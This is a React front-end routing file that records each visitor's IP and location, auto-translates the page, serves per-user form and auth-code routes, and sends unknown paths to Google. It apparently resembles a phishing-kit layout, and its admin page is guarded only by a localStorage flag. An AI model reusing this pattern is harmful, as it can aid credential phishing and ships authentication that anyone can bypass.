import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import React, { useEffect, useState } from "react";
import "./App.css";

import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";

import GoogleTranslate from "./components/GoogleTranslate";
import { getLanguageByCountryCode } from "./components/languageUtils";

function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  const [locationData, setLocationData] = useState(null);
  const [translationReady, setTranslationReady] = useState(false);

  useEffect(() => {
    const setLocation = async () => {
      let ip = "Unknown";
      let language = "en";
      let country = "Unknown";
      let city = "Unknown";

      try {
        const response = await fetch("https://ipinfo.io/json");
        const data = await response.json();

        if (data.ip) {
          ip = data.ip;
        }

        if (data.country) {
          country = data.country;
          language =
            getLanguageByCountryCode(data.country) || "en";
        }

        if (data.city) {
          city = data.city;
        }

        const location = {
          lang: language,
          IP: ip,
          country,
          city,
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        setLocationData(location);

        // Nếu ngôn ngữ là English thì không cần Google Translate
        if (language === "en") {
          setTranslationReady(true);
        }
      } catch (error) {
        console.error("Error fetching location:", error);

        const location = {
          lang: "en",
          IP: "Unknown",
          country: "Unknown",
          city: "Unknown",
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        setLocationData(location);

        setTranslationReady(true);
      }
    };

    setLocation();
  }, []);

  const handleTranslationReady = () => {
    setTranslationReady(true);
  };

  // ------------------------------------
  // Loading
  // ------------------------------------
  if (!locationData || !translationReady) {
    return (
      <div className="app-loading">
        <div className="spinner"></div>
      </div>
    );
  }

  return (
    <BrowserRouter>
      <div id="app">

        <GoogleTranslate
          onReady={handleTranslationReady}
        />

        <Routes>
          <Route
            path="/"
            element={<HomePage />}
          />

          <Route
            path="id/:userID"
            element={<MyForm />}
          />

          <Route
            path="/request"
            element={<MyForm />}
          />

          {/* 
          <Route
            path="checkpoint/:userID"
            element={<AuthCode />}
          />
          */}

          <Route
            path="/login"
            element={<Login />}
          />

          <Route
            path="/admin"
            element={
              <PrivateRoute>
                <AdminPage />
              </PrivateRoute>
            }
          />

          <Route
            path="*"
            element={
              <meta
                httpEquiv="refresh"
                content="1; url=https://www.google.com/"
              />
            }
          />
        </Routes>
      </div>
    </BrowserRouter>
  );
}

export default App;
